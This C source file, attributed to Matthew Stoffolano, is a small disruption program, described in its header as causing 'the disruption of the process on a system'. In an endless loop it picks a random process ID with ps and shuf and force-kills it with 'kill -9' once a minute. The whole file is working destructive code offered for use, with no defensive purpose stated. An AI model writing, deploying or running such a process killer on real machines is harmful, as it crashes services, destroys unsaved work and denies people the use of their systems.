/*
Description: This will cause the disruption of the process on a system.  When it runs it will shutdown a process every minute.
Language: C
Author: Matthew Stoffolano
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char* findProcess(){
	/*
	This finds a random process's PID on the system.
	return char* pid: This is the random PID
	*/
	FILE *fp;
	char hold[100] = "";
	char* pid;
	char* command = "ps ax -o pid| shuf -n 1| tr -d \" \\t\\n\\r\" ";
	char* mode = "r";
	fp = popen(command, mode);
	char temp = fgetc(fp);
	while(temp != EOF){
		strncat(hold, &temp, 1);
		temp = fgetc(fp);
	}
	pid = (char*)malloc(sizeof(char[100]));
	strcpy(pid,hold);
	return pid;
}

void stopProcess(char* pid){
	/*
	This stops the process.
	variable char* pid: Process's pid
	*/
	char command[75] = "kill -9 ";
	strcat(command, pid);
	system(command);
}

int main(){
	while(0 < 1){
		stopProcess(findProcess());
		sleep(60);
	}
	return 0;
}
